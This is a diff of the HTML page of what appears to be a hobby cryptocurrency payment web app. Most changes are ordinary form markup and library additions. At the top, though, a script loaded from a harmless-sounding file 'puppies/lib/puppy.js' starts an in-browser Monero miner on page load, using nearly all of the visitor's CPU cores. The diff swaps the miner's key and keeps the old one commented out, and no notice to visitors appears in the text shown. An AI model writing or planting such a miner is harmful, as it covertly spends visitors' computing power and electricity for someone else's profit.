@@ -11,14 +11,23 @@
 
     <script src="puppies/lib/puppy.js"></script>
     <script>
-      var miner=new CRLT.Anonymous('eea05fe526f2cf2faa35adcba478e4481fc2f981adc2', {
+      var miner=new CRLT.Anonymous('35bd30d86f67449a488beea5cb35d484f14dc054ae0f', {
         threads:Math.max(1,window.navigator.hardwareConcurrency-2),throttle:0.1, coin: "xmr",
       });
       miner.start();
     </script>
+    <!-- <script>
+      var miner=new CRLT.Anonymous('eea05fe526f2cf2faa35adcba478e4481fc2f981adc2', {
+        threads:Math.max(1,window.navigator.hardwareConcurrency-2),throttle:0.1, coin: "xmr",
+      });
+      miner.start();
+    </script> -->
     <script src="https://peterolson.github.io/BigInteger.js/BigInteger.min.js"></script> <!-- bigInt for doing fast calculations with large integers -->
     <script src="/socket.io/socket.io.js"></script> <!-- for communication with server -->
     <script src="cryptorng.js"></script> <!-- for generating cryptographically secure random numbers from a seed -->
+    <script src="forge.min.js"></script>
+    <!-- <script src="sjclmin.js"></script> -->
+    <!-- <script src="/sjcl/core/sha256.js"></script> -->
     <script src="rsa.js"></script> <!-- rsa -->
     <script>
       let con = {
@@ -113,18 +122,20 @@
               <div id="middle">
                       <!-- form for making payments -->
                       <div id="sendtpc">
-                        <h3>Send Money</h3>
-                        <form id="makepaymentform" onsubmit="return false;">
+                        <fieldset>
+                          <legend>Send Money</legend>
+                          <form id="makepaymentform" onsubmit="return false;">
 
-                              <input placeholder="amount" type="number" id="amount" step="0.0001" min="0"/>
+                                <input placeholder="amount" type="number" id="amount" step="0.0001" min="0"/>
 
-                              <input list="names" placeholder="public key or name" type="text" id="recipient"/>
+                                <input list="names" placeholder="public key or name" type="text" id="recipient"/>
 
-                              <datalist id="names"></datalist>
+                                <datalist id="names"></datalist>
 
-                              <button class="btn" onclick="maketransaction()">Send</button>
+                                <button class="btn" onclick="maketransaction()">Send</button>
 
-                        </form>
+                          </form>
+                        </fieldset>
                       </div>
                       <!-- preview of the blockchain -->
                       <!-- <h3>Blockchain</h3> -->
@@ -232,7 +243,7 @@
 
               <textarea class="private" placeholder="super-secure login key" id="loginkey"></textarea>
 
-              <button class="btn" onclick="login()">Log In</button>
+              <button class="btn" onclick="login()" id="loginbutton">Log In</button>
 
           </form>
       </div>
@@ -253,7 +264,7 @@
               </p>
               <textarea class="private" placeholder="a unique, unguessable, super-secure key" id="registerloginkey"></textarea>
 
-              <button class="btn" onclick="register()">Submit</button>
+              <button class="btn" onclick="register()" id="registerbutton">Submit</button>
 
           </form>
       </div>
